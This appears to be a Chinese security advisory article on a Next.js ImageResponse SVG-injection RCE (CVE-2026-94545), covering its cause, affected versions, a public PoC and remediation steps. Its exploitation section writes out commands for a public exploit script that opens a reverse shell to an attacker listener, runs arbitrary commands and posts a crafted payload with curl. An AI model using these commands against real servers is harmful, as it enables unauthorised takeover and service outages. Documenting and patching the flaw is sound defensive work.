#  Next.js ImageResponse RCE漏洞（附POC）  
原创 播风者
                    播风者  黑白之道   2026-09-30 00:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/nGzNudUIJ6OgGUqTaCGxg5yEiadF4mObgXMe8TiaHtgwVAvTmHf5IwvLfkXAjq7jqjNj8RDvSPPCQ5f1OI3evhGwYrTlQgS4FDpsSN9jUey9U/640?from=appmsg "")  
> **导语**  
：Next.js 16.2.0至16.3.5版本爆严重RCE漏洞。攻击者利用ImageResponse的SVG注入，配合libxml2原生解析器的内存损坏，可实现一键Getshell。官方CVSS评分9.5，POC已在GitHub公开。  
  
## 一、漏洞速览  
  
**风险等级**  
：🔴 严重（CVSS 4.0: 9.5 / CVSS 3.1: 10.0）  
  
**漏洞标识**  
：CVE-2026-94545 | BDU:2026-15201 | GHSA-vcvr-r3jv-pc5j  
  
**影响厂商/产品**  
：Vercel Next.js（next/og 模块）  
  
**影响版本**  
：Next.js 16.2.0 – 16.3.5（Node.js运行时 + sharp 已安装）  
  
**修复版本**  
：Next.js 16.3.6 / Satori 0.33.5  
## 二、漏洞成因  
  
Next.js 的 next/og 功能通过 Satori 将 JSX 渲染为 SVG，再由 sharp 调用原生库（libvips、librsvg、libxml2）将 SVG 光栅化为图片。  
  
Satori 在将用户输入的文本写入 SVG 时未做转义（CWE-116），攻击者可通过构造恶意 SVG 关闭周围标签并注入自定义标记。当 Next.js 运行在 Node.js 运行时且安装了 sharp 时，SVG 由原生 librsvg/libxml2 而非沙箱 WASM 渲染器处理，此时通过 XInclude 引用和嵌套 DTD 实体可触发 libxml2 内部内存损坏，进而劫持程序执行流。  
  
**关键限制条件**  
：  
- 必须使用 Node.js 运行时（export const runtime = 'edge'  
 不受影响）  
  
- 必须安装 sharp（无 sharp 时走 WASM 渲染路径，不可达RCE）  
  
- 攻击者可控数据必须传入 ImageResponse 子元素  
  
## 三、影响范围  
  
使用 Next.js next/og 生成 Open Graph 社交卡片图片的部署，凡满足以下全部条件的均受影响：  
- Next.js 版本 16.2.0 – 16.3.5  
  
- 路由运行在 Node.js 运行时（非 Edge）  
  
- 已安装 sharp npm 包  
  
- OG 图片路由接收未经清洗的用户输入  
  
## 四、漏洞利用  
  
EQSTLab 在 11 秒 PoC 演示视频中展示了从发包到拿到反弹 Shell 的完整过程。以下为按演示时间线抽取的关键帧（标签内容需结合 GitHub 仓库的演示文稿对照确认）：  
  
![PoC 演示 t=1s - 漏洞环境与 Payload 构造](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6PrWQPSFwpAl4RQXLRqRET1a30HBBVC5C3wlkK0oTBoly9ibiaWRGiaEvKokW7vFmjWMGtSky3ChVZ72FegbpnyiavCETLaqWMLSFs/640?from=appmsg "PoC 演示 t=1s - 漏洞环境与 Payload 构造")  
  
![PoC 演示 t=5s - 利用执行过程](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6OQXFO6KMHF268DPwo3fn3QTmaFyJPPNc03OBb0EajfyfbxZjZWvTNGCBZpX58Kr8S6pO57KIrkH8C5F3RsvbwE8BurdVkKQvA/640?from=appmsg "PoC 演示 t=5s - 利用执行过程")  
  
![PoC 演示 t=9s - 反弹 Shell 成功回显](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nGzNudUIJ6OKb3Q6cphZ107LkZOkSqkenfHfrK1I34U2XiaI57DkzTnDFic6u9jyFpFG099ceZwYyc1PXqJ6uC5jtYoHRC0MEW3yhIIzevZIM/640?from=appmsg "PoC 演示 t=9s - 反弹 Shell 成功回显")  
### 利用条件  
  
POC 作者已在 GitHub 公开完整漏洞环境与利用脚本。成功利用需满足：  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">条件</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">Next.js 16.3.5 + Node.js 运行时</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">精确匹配堆栈依赖</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">sharp 0.35.4（含 libvips 8.18.6、librsvg 2.62.91、libxml2 2.15.3）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">精确库版本</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">官方 Node.js 非 PIE 二进制（v24.20.0）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">GOT/代码无 ASLR，ROP 链稳定</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">攻击路径可达（OG 路由无认证）</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">单次未认证请求即触发</span></section></td></tr></tbody></table>### 快速验证环境  
```
docker build -t cve-2026-94545 .docker run -d --name cve-2026-94545 -p 3000:3000 cve-2026-94545# 验证服务可用curl -s -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:3000/api/og?value=hello"
```  
### 反弹 Shell  
```
python3 exploit.py --target <目标IP:3000> --lhost <监听IP:4444>
```  
### 单次命令执行（无监听）  
```
python3 exploit.py --target <目标IP:3000> --command "id"
```  
### 手动发送 Payload  
```
python3 exploit.py --target <目标IP:3000> --command "id" --output payload.bincurl --data-binary @payload.bin -H "Content-Type: text/plain" http://<目标>/api/og
```  
  
**注意**  
：成功利用后 Node.js 进程被替换，HTTP 连接关闭，服务中断直至重启。  
## 五、POC 下载  
  
漏洞环境与完整利用脚本已由 EQSTLab 公开：  
  
**GitHub 仓库**  
：https://github.com/EQSTLab/CVE-2026-94545  
  
包含 vulnerable-nextjs 完整 Docker 环境与 Python 利用脚本，支持反弹 Shell、单命令执行、自定义 Payload 发送。  
## 六、修复方案  
### 方案一（推荐）：升级  
```
# 升级 Next.jsnpm install next@latest# 或仅升级 Satorinpm install satori@latest
```  
  
**注意**  
：升级后建议重启服务，并视作已失陷处理——轮换所有应用层密钥，检查持久化痕迹。  
### 方案二（临时规避）  
1. 将 OG 图片路由切换为 Edge 运行时：```
export const runtime = 'edge'
```  
  
  
1. 或移除 sharp 包，切断原生解析路径：```
npm uninstall sharp
```  
  
  
1. 对所有传入 ImageResponse 的用户数据做严格过滤，避免 SVG 特殊字符（<  
、>  
、"  
、'  
）进入。  
  
### 规避后检查  
  
Edge 运行时不受此漏洞影响，但性能和 API 兼容性存在差异；移除 sharp 会导致部分图片格式/性能下降。建议优先采用升级方案。  
## 七、总结  
  
CVE-2026-94545 是一次典型的"依赖链"漏洞——上游 Satori 的 SVG 转义缺陷，经 Next.js next/og 的不安全使用方式放大，最终在特定运行时配置下演变为无需认证的 RCE。  
  
**处置优先级**  
：🔴 最高。公网暴露且使用受影响配置的 Next.js 应用应立即修复。  
  
**版权声明**  
：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/nGzNudUIJ6PfWhEgjjtzAVbfT2sKSNNKE3rVB23Lf7RQH0OQeiaN49Uia2gyJDc9Xpb3G9uEXKdQzTTlHngM9hbKSqRv9tbUdSdafKLo5zWB4/640?from=appmsg "")  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621549&idx=1&sn=21c4b072726d2387d562109ada6b9bbb&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650621944&idx=1&sn=3cc6dc9876a20466d4ec3634deb80220&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650622065&idx=1&sn=09f8ae84c06d4331e71c277b177ae701&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
